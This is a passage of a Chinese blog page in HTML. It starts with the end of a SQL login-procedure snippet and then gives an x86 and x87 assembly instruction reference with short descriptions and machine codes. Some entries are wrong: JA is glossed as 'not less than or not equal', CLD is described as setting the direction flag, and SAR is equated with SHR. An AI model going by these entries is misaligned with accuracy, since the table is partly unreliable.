variable">@upwd</span><span class="token punctuation">)</span><span class="token keyword">select</span> <span class="token string">'-2'</span>   <span class="token keyword">else</span>     <span class="token keyword">select</span>   <span class="token string">'0'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><p>汇编指令集太多，如果不用就会忘记，所以将i处理器官方的指令集大全写到博客上，有需要的人可以参考一下！</p><h2 id="一、数据传输指令"><a href="#一、数据传输指令" class="headerlink" title="一、数据传输指令"></a>一、数据传输指令</h2><p> 它们在存贮器和寄存器、寄存器和输入输出端口之间传送数据.</p><h3 id="1-通用数据传送指令"><a href="#1-通用数据传送指令" class="headerlink" title="1. 通用数据传送指令"></a>1. 通用数据传送指令</h3><pre class="line-numbers language-objectivec" data-language="objectivec"><code class="language-objectivec">MOV     传送字或字节<span class="token punctuation">.</span>  MOVSX   先符号扩展<span class="token punctuation">,</span>再传送<span class="token punctuation">.</span>  MOVZX   先零扩展<span class="token punctuation">,</span>再传送<span class="token punctuation">.</span>  PUSH    把字压入堆栈<span class="token punctuation">.</span>  POP     把字弹出堆栈<span class="token punctuation">.</span>  PUSHA   把AX<span class="token punctuation">,</span>CX<span class="token punctuation">,</span>DX<span class="token punctuation">,</span>BX<span class="token punctuation">,</span>SP<span class="token punctuation">,</span>BP<span class="token punctuation">,</span>SI<span class="token punctuation">,</span>DI依次压入堆栈<span class="token punctuation">.</span>  POPA    把DI<span class="token punctuation">,</span>SI<span class="token punctuation">,</span>BP<span class="token punctuation">,</span>SP<span class="token punctuation">,</span>BX<span class="token punctuation">,</span>DX<span class="token punctuation">,</span>CX<span class="token punctuation">,</span>AX依次弹出堆栈<span class="token punctuation">.</span>  PUSHAD  把EAX<span class="token punctuation">,</span>ECX<span class="token punctuation">,</span>EDX<span class="token punctuation">,</span>EBX<span class="token punctuation">,</span>ESP<span class="token punctuation">,</span>EBP<span class="token punctuation">,</span>ESI<span class="token punctuation">,</span>EDI依次压入堆栈<span class="token punctuation">.</span>  POPAD   把EDI<span class="token punctuation">,</span>ESI<span class="token punctuation">,</span>EBP<span class="token punctuation">,</span>ESP<span class="token punctuation">,</span>EBX<span class="token punctuation">,</span>EDX<span class="token punctuation">,</span>ECX<span class="token punctuation">,</span>EAX依次弹出堆栈<span class="token punctuation">.</span>  BSWAP   交换<span class="token number">32</span>位寄存器里字节的顺序  XCHG    交换字或字节<span class="token punctuation">.</span><span class="token punctuation">(</span>至少有一个操作数为寄存器<span class="token punctuation">,</span>段寄存器不可作为操作数<span class="token punctuation">)</span>  CMPXCHG 比较并交换操作数<span class="token punctuation">.</span><span class="token punctuation">(</span>第二个操作数必须为累加器AL<span class="token operator">/</span>AX<span class="token operator">/</span>EAX<span class="token punctuation">)</span>  XADD    先交换再累加<span class="token punctuation">.</span><span class="token punctuation">(</span>结果在第一个操作数里<span class="token punctuation">)</span>  XLAT    字节查表转换<span class="token punctuation">.</span><span class="token operator">--</span><span class="token operator">--</span>BX指向一张<span class="token number">256</span>字节的表的起点<span class="token punctuation">,</span>AL为表的索引值<span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">255</span><span class="token punctuation">,</span>即<span class="token number">0</span><span class="token operator">-</span>FFH<span class="token punctuation">)</span><span class="token punctuation">;</span>返回AL为查表结果<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token punctuation">[</span>BX<span class="token operator">+</span>AL<span class="token punctuation">]</span><span class="token operator">-></span>AL<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-输入输出端口传送指令"><a href="#2-输入输出端口传送指令" class="headerlink" title="2. 输入输出端口传送指令."></a>2. 输入输出端口传送指令.</h3><pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">IN      I&#x2F;O端口输入. ( 语法: IN   累加器,    &#123;端口号│DX&#125; )  OUT     I&#x2F;O端口输出. ( 语法: OUT &#123;端口号│DX&#125;,累加器 )输入输出端口由立即方式指定时,    其范围是 0-255; 由寄存器 DX 指定时,其范围是    0-65535.  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-目的地址传送指令"><a href="#3-目的地址传送指令" class="headerlink" title="3. 目的地址传送指令."></a>3. 目的地址传送指令.</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">LEA     装入有效地址<span class="token punctuation">.</span>例<span class="token operator">:</span> LEA DX<span class="token punctuation">,</span>string <span class="token punctuation">;</span>把偏移地址存到DX<span class="token punctuation">.</span>  LDS     传送目标指针<span class="token punctuation">,</span>把指针内容装入DS<span class="token punctuation">.</span>例<span class="token operator">:</span> LDS SI<span class="token punctuation">,</span>string   <span class="token punctuation">;</span>把段地址<span class="token operator">:</span>偏移地址存到DS<span class="token operator">:</span>SI<span class="token punctuation">.</span>  LES     传送目标指针<span class="token punctuation">,</span>把指针内容装入ES<span class="token punctuation">.</span>例<span class="token operator">:</span> LES DI<span class="token punctuation">,</span>string   <span class="token punctuation">;</span>把段地址<span class="token operator">:</span>偏移地址存到ES<span class="token operator">:</span>DI<span class="token punctuation">.</span>  LFS     传送目标指针<span class="token punctuation">,</span>把指针内容装入FS<span class="token punctuation">.</span>例<span class="token operator">:</span> LFS DI<span class="token punctuation">,</span>string   <span class="token punctuation">;</span>把段地址<span class="token operator">:</span>偏移地址存到FS<span class="token operator">:</span>DI<span class="token punctuation">.</span>  LGS     传送目标指针<span class="token punctuation">,</span>把指针内容装入GS<span class="token punctuation">.</span>例<span class="token operator">:</span> LGS DI<span class="token punctuation">,</span>string   <span class="token punctuation">;</span>把段地址<span class="token operator">:</span>偏移地址存到GS<span class="token operator">:</span>DI<span class="token punctuation">.</span>  LSS     传送目标指针<span class="token punctuation">,</span>把指针内容装入SS<span class="token punctuation">.</span>例<span class="token operator">:</span> LSS DI<span class="token punctuation">,</span>string   <span class="token punctuation">;</span>把段地址<span class="token operator">:</span>偏移地址存到SS<span class="token operator">:</span>DI<span class="token punctuation">.</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-标志传送指令"><a href="#4-标志传送指令" class="headerlink" title="4. 标志传送指令."></a>4. 标志传送指令.</h3><pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">LAHF    标志寄存器传送,把标志装入AH.  SAHF    标志寄存器传送,把AH内容装入标志寄存器.  PUSHF   标志入栈.  POPF    标志出栈.  PUSHD   32位标志入栈.  POPD    32位标志出栈.  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二、算术运算指令"><a href="#二、算术运算指令" class="headerlink" title="二、算术运算指令"></a>二、算术运算指令</h2><pre class="line-numbers language-objectivec" data-language="objectivec"><code class="language-objectivec">ADC     带进位加法<span class="token punctuation">.</span>  INC     加 <span class="token number">1.</span>  AAA     加法的ASCII码调整<span class="token punctuation">.</span>  DAA     加法的十进制调整<span class="token punctuation">.</span>  SUB     减法<span class="token punctuation">.</span>  SBB     带借位减法<span class="token punctuation">.</span>  DEC     减 <span class="token number">1.</span>  NEG     求反<span class="token punctuation">(</span>以    <span class="token number">0</span> 减之<span class="token punctuation">)</span><span class="token punctuation">.</span>  CMP     比较<span class="token punctuation">.</span><span class="token punctuation">(</span>两操作数作减法<span class="token punctuation">,</span>仅修改标志位<span class="token punctuation">,</span>不回送结果<span class="token punctuation">)</span><span class="token punctuation">.</span>  AAS     减法的ASCII码调整<span class="token punctuation">.</span>  DAS     减法的十进制调整<span class="token punctuation">.</span>  MUL     无符号乘法<span class="token punctuation">.</span>结果回送AH和<span class="token function">AL</span><span class="token punctuation">(</span>字节运算<span class="token punctuation">)</span><span class="token punctuation">,</span>或DX和<span class="token function">AX</span><span class="token punctuation">(</span>字运算<span class="token punctuation">)</span><span class="token punctuation">,</span>  IMUL    整数乘法<span class="token punctuation">.</span>结果回送AH和<span class="token function">AL</span><span class="token punctuation">(</span>字节运算<span class="token punctuation">)</span><span class="token punctuation">,</span>或DX和<span class="token function">AX</span><span class="token punctuation">(</span>字运算<span class="token punctuation">)</span><span class="token punctuation">,</span>  AAM     乘法的ASCII码调整<span class="token punctuation">.</span>  DIV     无符号除法<span class="token punctuation">.</span>结果回送<span class="token punctuation">:</span>商回送AL<span class="token punctuation">,</span>余数回送AH<span class="token punctuation">,</span> <span class="token punctuation">(</span>字节运算<span class="token punctuation">)</span><span class="token punctuation">;</span>或 商回送AX<span class="token punctuation">,</span>余数回送DX<span class="token punctuation">,</span> <span class="token punctuation">(</span>字运算<span class="token punctuation">)</span><span class="token punctuation">.</span>  IDIV    整数除法<span class="token punctuation">.</span>结果回送<span class="token punctuation">:</span>商回送AL<span class="token punctuation">,</span>余数回送AH<span class="token punctuation">,</span> <span class="token punctuation">(</span>字节运算<span class="token punctuation">)</span><span class="token punctuation">;</span>或 商回送AX<span class="token punctuation">,</span>余数回送DX<span class="token punctuation">,</span> <span class="token punctuation">(</span>字运算<span class="token punctuation">)</span><span class="token punctuation">.</span>  AAD     除法的ASCII码调整<span class="token punctuation">.</span>  CBW     字节转换为字<span class="token punctuation">.</span> <span class="token punctuation">(</span>把AL中字节的符号扩展到AH中去<span class="token punctuation">)</span>  CWD     字转换为双字<span class="token punctuation">.</span> <span class="token punctuation">(</span>把AX中的字的符号扩展到DX中去<span class="token punctuation">)</span>  CWDE    字转换为双字<span class="token punctuation">.</span> <span class="token punctuation">(</span>把AX中的字符号扩展到EAX中去<span class="token punctuation">)</span>  CDQ     双字扩展<span class="token punctuation">.</span> <span class="token punctuation">(</span>把EAX中的字的符号扩展到EDX中去<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、逻辑运算指令"><a href="#三、逻辑运算指令" class="headerlink" title="三、逻辑运算指令"></a>三、逻辑运算指令</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">AND</span>     与运算<span class="token punctuation">.</span>  <span class="token keyword">OR</span>      或运算<span class="token punctuation">.</span>  <span class="token keyword">XOR</span>     异或运算<span class="token punctuation">.</span>  <span class="token constant">NOT</span>     取反<span class="token punctuation">.</span>  <span class="token constant">TEST</span>    测试<span class="token punctuation">.</span><span class="token punctuation">(</span>两操作数作与运算<span class="token punctuation">,</span>仅修改标志位<span class="token punctuation">,</span>不回送结果<span class="token punctuation">)</span><span class="token punctuation">.</span>  <span class="token constant">SHL</span>     逻辑左移<span class="token punctuation">.</span>  <span class="token constant">SAL</span>     算术左移<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">=</span><span class="token constant">SHL</span><span class="token punctuation">)</span>  <span class="token constant">SHR</span>     逻辑右移<span class="token punctuation">.</span>  <span class="token constant">SAR</span>     算术右移<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">=</span><span class="token constant">SHR</span><span class="token punctuation">)</span>  <span class="token constant">ROL</span>     循环左移<span class="token punctuation">.</span>  <span class="token constant">ROR</span>     循环右移<span class="token punctuation">.</span>  <span class="token constant">RCL</span>     通过进位的循环左移<span class="token punctuation">.</span>  <span class="token constant">RCR</span>     通过进位的循环右移<span class="token punctuation">.</span>            以上八种移位指令<span class="token punctuation">,</span>其移位次数可达<span class="token number">255</span>次<span class="token punctuation">.</span>            移位一次时<span class="token punctuation">,</span> 可直接用操作码<span class="token punctuation">.</span> 如 <span class="token constant">SHL</span> <span class="token constant">AX</span><span class="token punctuation">,</span><span class="token number">1.</span>            移位<span class="token operator">></span><span class="token number">1</span>次时<span class="token punctuation">,</span> 则由寄存器<span class="token constant">CL</span>给出移位次数<span class="token punctuation">.</span>            如 <span class="token constant">MOV</span> <span class="token constant">CL</span><span class="token punctuation">,</span><span class="token number">04</span>   <span class="token constant">SHL</span> <span class="token constant">AX</span><span class="token punctuation">,</span><span class="token constant">CL</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、串指令"><a href="#四、串指令" class="headerlink" title="四、串指令"></a>四、串指令</h2><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">          DS:SI 源串段寄存器 :源串变址.            ES:DI 目标串段寄存器:目标串变址.            CX 重复次数计数器.            AL/AX 扫描值.            D标志   0表示重复操作中SI和DI应自动增量; 1表示应自动减量.            Z标志   用来控制扫描或比较操作的结束.  MOVS    串传送.( MOVSB 传送字符. MOVSW 传送字. MOVSD 传送双字. )  CMPS    串比较.( CMPSB 比较字符. CMPSW 比较字. )  SCAS    串扫描.把AL或AX的内容与目标串作比较,比较结果反映在标志位.  LODS    装入串.把源串中的元素(字或字节)逐一装入AL或AX中.( LODSB 传送字符. LODSW 传送字.    LODSD 传送双字. )  STOS    保存串.是LODS的逆过程.  REP         当CX/ECX&lt;>0时重复.  REPE/REPZ   当ZF=1或比较结果相等,且CX/ECX&lt;>0时重复.  REPNE/REPNZ 当ZF=0或比较结果不相等,且CX/ECX&lt;>0时重复.  REPC        当CF=1且CX/ECX&lt;>0时重复.  REPNC       当CF=0且CX/ECX&lt;>0时重复.  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="五、程序转移指令"><a href="#五、程序转移指令" class="headerlink" title="五、程序转移指令"></a>五、程序转移指令</h2><h3 id="1-无条件转移指令-长转移"><a href="#1-无条件转移指令-长转移" class="headerlink" title="1. 无条件转移指令 (长转移)"></a>1. 无条件转移指令 (长转移)</h3><pre class="line-numbers language-objectivec" data-language="objectivec"><code class="language-objectivec">JMP         无条件转移指令  CALL        过程调用  RET<span class="token operator">/</span>RETF    过程返回<span class="token punctuation">.</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="2-条件转移指令-短转移-128到-127的距离内-当且仅当-SF-XOR-OF-1时-OP1-lt-OP2"><a href="#2-条件转移指令-短转移-128到-127的距离内-当且仅当-SF-XOR-OF-1时-OP1-lt-OP2" class="headerlink" title="2. 条件转移指令      (短转移,-128到+127的距离内)( 当且仅当(SF XOR OF)=1时,OP1&lt;OP2 )"></a>2. 条件转移指令      (短转移,-128到+127的距离内)( 当且仅当(SF XOR OF)=1时,OP1&lt;OP2 )</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">JA/JNBE     不小于或不等于时转移.  JAE/JNB     大于或等于转移.  JB/JNAE     小于转移.  JBE/JNA     小于或等于转移.      以上四条,测试无符号整数运算的结果<span class="token punctuation">(</span>标志C和Z<span class="token punctuation">)</span>.  JG/JNLE     大于转移.  JGE/JNL     大于或等于转移.  JL/JNGE     小于转移.  JLE/JNG     小于或等于转移.      以上四条,测试带符号整数运算的结果<span class="token punctuation">(</span>标志S,O和Z<span class="token punctuation">)</span>.  JE/JZ       等于转移.  JNE/JNZ     不等于时转移.  JC          有进位时转移.  JNC         无进位时转移.  JNO         不溢出时转移.  JNP/JPO     奇偶性为奇数时转移.  JNS         符号位为 <span class="token string">"0"</span> 时转移.  JO          溢出转移.  JP/JPE      奇偶性为偶数时转移.  JS          符号位为 <span class="token string">"1"</span> 时转移.  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-循环控制指令-短转移"><a href="#3-循环控制指令-短转移" class="headerlink" title="3. 循环控制指令(短转移)"></a>3. 循环控制指令(短转移)</h3><pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">LOOP            CX不为零时循环.  LOOPE&#x2F;LOOPZ     CX不为零且标志Z&#x3D;1时循环.  LOOPNE&#x2F;LOOPNZ   CX不为零且标志Z&#x3D;0时循环.  JCXZ            CX为零时转移.  JECXZ           ECX为零时转移.  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-中断指令"><a href="#4-中断指令" class="headerlink" title="4. 中断指令"></a>4. 中断指令</h3><pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">INT         中断指令  INTO        溢出中断  IRET        中断返回  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="5-处理器控制指令"><a href="#5-处理器控制指令" class="headerlink" title="5. 处理器控制指令"></a>5. 处理器控制指令</h3><pre class="line-numbers language-objectivec" data-language="objectivec"><code class="language-objectivec">HLT         处理器暂停<span class="token punctuation">,</span>  直到出现中断或复位信号才继续<span class="token punctuation">.</span>  WAIT        当芯片引线TEST为高电平时使CPU进入等待状态<span class="token punctuation">.</span>  ESC         转换到外处理器<span class="token punctuation">.</span>  LOCK        封锁总线<span class="token punctuation">.</span>  NOP         空操作<span class="token punctuation">.</span>  STC         置进位标志位<span class="token punctuation">.</span>  CLC         清进位标志位<span class="token punctuation">.</span>  CMC         进位标志取反<span class="token punctuation">.</span>  STD         置方向标志位<span class="token punctuation">.</span>  CLD         清方向标志位<span class="token punctuation">.</span>  STI         置中断允许位<span class="token punctuation">.</span>  CLI         清中断允许位<span class="token punctuation">.</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="六、伪指令"><a href="#六、伪指令" class="headerlink" title="六、伪指令"></a>六、伪指令</h2><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token constant">DW</span>          定义字<span class="token punctuation">(</span><span class="token number">2</span>字节<span class="token punctuation">)</span><span class="token punctuation">.</span>  <span class="token constant">PROC</span>        定义过程<span class="token punctuation">.</span>  <span class="token constant">ENDP</span>        过程结束<span class="token punctuation">.</span>  <span class="token constant">SEGMENT</span>     定义段<span class="token punctuation">.</span>  <span class="token constant">ASSUME</span>      建立段寄存器寻址<span class="token punctuation">.</span>  <span class="token constant">ENDS</span>        段结束<span class="token punctuation">.</span>  <span class="token keyword">END</span>         程序结束<span class="token punctuation">.</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="七、处理机控制指令：标志处理指令"><a href="#七、处理机控制指令：标志处理指令" class="headerlink" title="七、处理机控制指令：标志处理指令"></a>七、处理机控制指令：标志处理指令</h2><pre class="line-numbers language-objectivec" data-language="objectivec"><code class="language-objectivec">CLC     进位位置<span class="token number">0</span>指令  CMC     进位位求反指令  STC     进位位置为<span class="token number">1</span>指令  CLD     方向标志置<span class="token number">1</span>指令  STD     方向标志位置<span class="token number">1</span>指令  CLI     中断标志置<span class="token number">0</span>指令  STI     中断标志置<span class="token number">1</span>指令  NOP     无操作  HLT     停机  WAIT    等待  ESC     换码  LOCK    封锁  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="浮点运算指令集"><a href="#浮点运算指令集" class="headerlink" title="========== 浮点运算指令集 ========="></a>========== 浮点运算指令集 =========</h2><h3 id="一、控制指令-带9B的控制指令前缀F变为FN时浮点不检查，机器码去掉9B-—"><a href="#一、控制指令-带9B的控制指令前缀F变为FN时浮点不检查，机器码去掉9B-—" class="headerlink" title="一、控制指令(带9B的控制指令前缀F变为FN时浮点不检查，机器码去掉9B)—-"></a>一、控制指令(带9B的控制指令前缀F变为FN时浮点不检查，机器码去掉9B)—-</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token constant">FINIT</span>                 初始化浮点部件                  机器码  9B <span class="token constant">DB</span> <span class="token constant">E3</span>  <span class="token constant">FCLEX</span>                 清除异常                         机器码  9B <span class="token constant">DB</span> <span class="token constant">E2</span>  <span class="token constant">FDISI</span>                 浮点检查禁止中断                 机器码  9B <span class="token constant">DB</span> <span class="token constant">E1</span>  <span class="token constant">FENI</span>                  浮点检查禁止中断二            机器码  9B <span class="token constant">DB</span> <span class="token constant">E0</span>  <span class="token constant">WAIT</span>                  同步<span class="token constant">CPU</span>和<span class="token constant">FPU</span>                    机器码  9B  <span class="token constant">FWAIT</span>                 同步<span class="token constant">CPU</span>和<span class="token constant">FPU</span>                    机器码  <span class="token constant">D9</span> <span class="token constant">D0</span>  <span class="token constant">FNOP</span>                  无操作                          机器码  <span class="token constant">DA</span> <span class="token constant">E9</span>  <span class="token constant">FXCH</span>                  交换<span class="token constant">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>和<span class="token constant">ST</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                机器码  <span class="token constant">D9</span> <span class="token constant">C9</span>  <span class="token constant">FXCH</span> <span class="token constant">ST</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>            交换<span class="token constant">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>和<span class="token constant">ST</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                机器码  <span class="token constant">D9</span> <span class="token class-name">C1iii</span>  <span class="token constant">FSTSW</span> ax              状态字到ax                       机器码  9B <span class="token constant">DF</span> <span class="token constant">E0</span>  <span class="token constant">FSTSW</span>   word ptr mem  状态字到mem                      机器码  9B <span class="token constant">DD</span> mm111mmm  <span class="token constant">FLDCW</span>   word ptr mem  mem到状态字                      机器码  <span class="token constant">D9</span> mm101mmm  <span class="token constant">FSTCW</span>   word ptr mem  控制字到mem                      机器码  9B <span class="token constant">D9</span> mm111mmm    <span class="token constant">FLDENV</span>  word ptr mem  mem到全环境                      机器码  <span class="token constant">D9</span> mm100mmm  <span class="token constant">FSTENV</span>  word ptr mem  全环境到mem                      机器码  9B <span class="token constant">D9</span> mm110mmm  <span class="token constant">FRSTOR</span>  word ptr mem  mem到<span class="token constant">FPU</span>状态                    机器码  <span class="token constant">DD</span> mm100mmm  <span class="token constant">FSAVE</span>   word ptr mem  <span class="token constant">FPU</span>状态到mem                    机器码  9B <span class="token constant">DD</span> mm110mmm    <span class="token constant">FFREE</span> <span class="token constant">ST</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>           标志<span class="token constant">ST</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>未使用                   机器码  <span class="token constant">DD</span> <span class="token class-name">C0iii</span>  <span class="token constant">FDECSTP</span>               减少栈指针<span class="token number">1</span><span class="token punctuation">-></span><span class="token number">0</span> <span class="token number">2</span><span class="token punctuation">-></span><span class="token number">1</span>             机器码  <span class="token constant">D9</span> <span class="token constant">F6</span>  <span class="token constant">FINCSTP</span>               增加栈指针<span class="token number">0</span><span class="token punctuation">-></span><span class="token number">1</span> <span class="token number">1</span><span class="token punctuation">-></span><span class="token number">2</span>             机器码  <span class="token constant">D9</span> <span class="token constant">F7</span>  <span class="token constant">FSETPM</span>                浮点设置保护                       机器码  <span class="token constant">DB</span> <span class="token constant">E4</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="二、数据传送指令"><a href="#二、数据传送指令" class="headerlink" title="二、数据传送指令"></a>二、数据传送指令</h3><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">FLDZ                  将<span class="token number">0.0</span>装入<span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                  机器码  D9 EE  FLD1                  将<span class="token number">1.0</span>装入<span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                  机器码  D9 E8  FLDPI                 将π装入<span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                    机器码  D9 EB  FLDL2T                将ln10<span class="token operator">/</span>ln2装入<span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>             机器码  D9 E9  FLDL2E                将<span class="token number">1</span><span class="token operator">/</span>ln2装入<span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                机器码  D9 EA  FLDLG2                将ln2<span class="token operator">/</span>ln10装入<span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>             机器码  D9 EC  FLDLN2                将ln2装入<span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                  机器码  D9 ED    FLD    real4 ptr mem  装入mem的单精度浮点数             机器码  D9 mm000mmm  FLD    real8 ptr mem  装入mem的双精度浮点数             机器码  DD mm000mmm  FLD   real10 ptr mem  装入mem的十字节浮点数             机器码  DB mm101mmm    FILD    word ptr mem  装入mem的二字节整数              机器码  DF mm000mmm  FILD   dword ptr mem  装入mem的四字节整数              机器码  DB mm000mmm  FILD   qword ptr mem  装入mem的八字节整数              机器码  DF mm101mmm    FBLD   tbyte ptr mem  装入mem的十字节BCD数            机器码  DF mm100mmm    FST    real4 ptr mem  保存单精度浮点数到mem             机器码  D9 mm010mmm  FST    real8 ptr mem  保存双精度浮点数到mem             机器码  DD mm010mmm    FIST    word ptr mem  保存二字节整数到mem              机器码  DF mm010mmm  FIST   dword ptr mem  保存四字节整数到mem              机器码  DB mm010mmm    FSTP   real4 ptr mem  保存单精度浮点数到mem并出栈      机器码  D9 mm011mmm  FSTP   real8 ptr mem  保存双精度浮点数到mem并出栈      机器码  DD mm011mmm  FSTP  real10 ptr mem  保存十字节浮点数到mem并出栈      机器码  DB mm111mmm    FISTP   word ptr mem  保存二字节整数到mem并出栈           机器码  DF mm011mmm  FISTP  dword ptr mem  保存四字节整数到mem并出栈           机器码  DB mm011mmm  FISTP  qword ptr mem  保存八字节整数到mem并出栈           机器码  DF mm111mmm    FBSTP  tbyte ptr mem  保存十字节BCD数到mem并出栈     机器码  DF mm110mmm    <span class="token return-type class-name">FCMOVB</span>                <span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">ST</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">&lt;</span>时传送              机器码  DA C0iii  <span class="token return-type class-name">FCMOVBE</span>               <span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">ST</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">&lt;=</span>时传送             机器码  DA D0iii  <span class="token return-type class-name">FCMOVE</span>                <span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">ST</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">=</span>时传送             机器码  DA C1iii  <span class="token return-type class-name">FCMOVNB</span>               <span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">ST</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">>=</span>时传送             机器码  DB C0iii  <span class="token return-type class-name">FCMOVNBE</span>              <span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">ST</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">></span>时传送              机器码  DB D0iii  <span class="token return-type class-name">FCMOVNE</span>               <span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">ST</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">!=</span>时传送            机器码  DB C1iii  <span class="token return-type class-name">FCMOVNU</span>               <span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">ST</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> 有序时传送        机器码  DB D1iii  <span class="token return-type class-name">FCMOVU</span>                <span class="token function">ST</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">ST</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> 无序时传送        机器码  DA D1iii  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="三、比较指令"><a href="#三、比较指令" class="headerlink" title="三、比较指令"></a>三、比较指令</h3><pre class="line-numbers language-undefined" data-language="undefined"><code class="language-undefined">FCOM                  ST(0)-ST(1)                      机器码  D8 D1  FCOMI                 ST(0),ST(i)  ST(0)-ST(1)         机器码  DB F0iii  FCOMIP                